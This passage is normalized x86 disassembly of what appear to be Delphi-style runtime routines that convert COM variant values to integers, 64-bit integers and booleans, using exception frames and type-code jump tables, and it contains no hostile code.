mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f32c
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f9bc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f96f
lea eax [ ebp - 0x14 ]
call sub_40f004
retn
sub_40f978
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f9bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fddd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f9ef ]
mov eax [ ebp - 0x4 ]
call sub_40f824
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f824
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f9bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f8d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f914
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e7cc
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f978
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f8d8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f8d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fc13 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f824
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f9bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403060
sub_40fe0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e7cc
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fe98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f9bc
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403060
sub_40febc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e7cc
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40ff3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f9bc
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403060
sub_40ff64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410038
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f9bc
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40ff8a ]
jmp [ eax * 4 + jump_table_40ff9c ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403060
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e7cc
sub_41005c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_410111
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f9bc
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41007e ]
jmp [ eax * 4 + jump_table_410091 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403060
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e7cc
sub_410134
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4101f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410480
test edx edx
je r-xdata
mov al [ eax + lookup_table_41015a ]
jmp [ eax * 4 + jump_table_41016e ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403060
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e7cc
sub_41021c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_40292c
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ec60
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410a7c
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4102c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4103b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412a44
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404140
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408258
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103bd
lea eax [ ebp - 0x1c ]
call sub_403eb8
lea eax [ ebp - 0xc ]
call sub_4045c4
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_40292c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ec60
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410a7c
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_4103c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41041f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f32c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410480
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410426
lea eax [ ebp - 0x18 ]
call sub_40f004
retn
sub_410434
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410480
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41088c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4104b3 ]
mov eax [ ebp - 0x4 ]
call sub_4102c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4102c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410480
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41021c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4103c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e7cc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410434
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_41021c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_41021c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4106d7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_40292c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4102c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410480
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_4108c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41097b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412a44
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404140
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408344
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410982
lea eax [ ebp - 0x10 ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_4045c4
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ec60
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ec60
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_41098c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ec60
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_4109cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410a20
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f32c
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410a7c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a27
lea eax [ ebp - 0x11 ]
call sub_40f004
retn
sub_410a30
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410a7c
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410a96 ]
mov eax ebx
call sub_4108c4
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_4108c4
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410a7c
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_41098c
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_4109cc
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e7cc
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410a30
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41098c
mov [ esp ] al
mov eax ebx
call sub_41098c
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410c58 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
